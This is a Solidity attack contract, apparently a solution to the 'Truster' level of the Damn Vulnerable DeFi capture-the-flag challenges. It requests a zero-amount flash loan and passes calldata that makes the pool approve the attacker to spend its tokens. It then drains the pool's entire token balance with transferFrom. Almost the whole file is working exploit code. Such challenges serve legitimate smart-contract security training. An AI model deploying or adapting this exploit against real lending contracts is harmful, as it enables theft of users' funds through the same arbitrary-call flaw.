// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPool {
  function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
}

interface IDamnValuableToken {
  function transferFrom(address from, address to, uint256 amount) external;
  function transfer(address to, uint256 amount) external;
  function balanceOf(address account) external returns (uint256);
}

/**
 * @title AttackTruster
 */

contract AttackTruster {
  
    IPool pool;
    IDamnValuableToken token;
    address attacker;

    constructor(address _pool, address _token) {
        pool = IPool(_pool);
        token = IDamnValuableToken(_token);
        attacker = msg.sender;
    }

    function run() public {

      uint256 amount = token.balanceOf(address(pool));

      uint256 borrowAmount = 0;
      address borrower = attacker;
      address target = address(token);
      bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);

      pool.flashLoan(borrowAmount, borrower, target, data);

      token.transferFrom(address(pool), borrower, amount);

    }

}
